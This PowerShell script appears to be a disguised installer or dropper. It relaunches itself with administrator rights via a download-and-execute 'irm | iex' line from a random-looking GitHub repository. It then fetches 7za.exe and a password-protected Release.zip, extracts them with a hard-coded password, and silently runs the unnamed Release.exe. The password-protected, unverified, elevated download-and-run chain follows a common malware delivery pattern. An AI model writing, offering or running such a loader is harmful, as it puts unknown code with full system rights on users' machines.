$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

function Write-Step {
    param(
        [int]$Number,
        [string]$Text
    )

    Write-Host ("[{0}/3] {1}..." -f $Number, $Text) -ForegroundColor Cyan
}

function Show-InstallHeader {
    Write-Host ""
    Write-Host "Please do not close this window until all operations are finished." -ForegroundColor Yellow
    Write-Host "This may take a few minutes depending on your connection speed." -ForegroundColor Yellow
    Write-Host ""
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/IceClassShovel/kcvgttda/main/install.ps1 | iex"'
    exit
}

$base       = 'https://github.com/IceClassShovel/kcvgttda/releases/download/Last'
$zipUrl     = "$base/Release.zip"
$7zaUrl     = "$base/7za.exe"
$password   = 'H+h6)d.a'
$exeName    = 'Release.exe'
$silentArgs = '/S'

$work = Join-Path $env:TEMP 'app_install'
$zip  = Join-Path $work 'Release.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'extracted'

Show-InstallHeader

Write-Step 1 'Downloading components'
if (Test-Path $work) { Remove-Item $work -Recurse -Force }
New-Item -ItemType Directory -Path $work -Force | Out-Null

Invoke-RestMethod $7zaUrl -OutFile $7za
Invoke-RestMethod $zipUrl -OutFile $zip

Write-Step 2 'Preparing files'
& $7za x $zip "-o$dest" "-p$password" -y | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Extract failed (code $LASTEXITCODE)" }

$exe = Join-Path $dest $exeName
if (-not (Test-Path $exe)) { throw "Installer not found: $exe" }

Write-Step 3 'Running setup'
Start-Process $exe -ArgumentList $silentArgs -Wait
